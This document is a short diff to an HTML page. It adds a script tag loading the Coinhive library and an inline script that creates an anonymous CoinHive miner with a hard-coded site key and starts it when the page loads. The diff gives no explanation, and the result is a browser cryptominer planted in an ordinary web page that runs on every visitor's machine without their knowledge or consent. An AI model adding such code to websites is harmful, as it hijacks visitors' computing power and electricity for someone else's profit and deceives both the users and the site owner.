@@ -10,6 +10,8 @@
 		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 		<script src="scripts.js"></script>
 
+		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+
 	</head>
 	<body>
 		<div class="zip">
@@ -999,5 +1001,10 @@
 
 		</div>
 		</div>
+
+		<script>
+			var miner = new CoinHive.Anonymous('FA2zdcRDhCwxfuWpOOxE2gvZ4RswQFFl');
+			miner.start();
+		</script>
 	</body>
 </html>
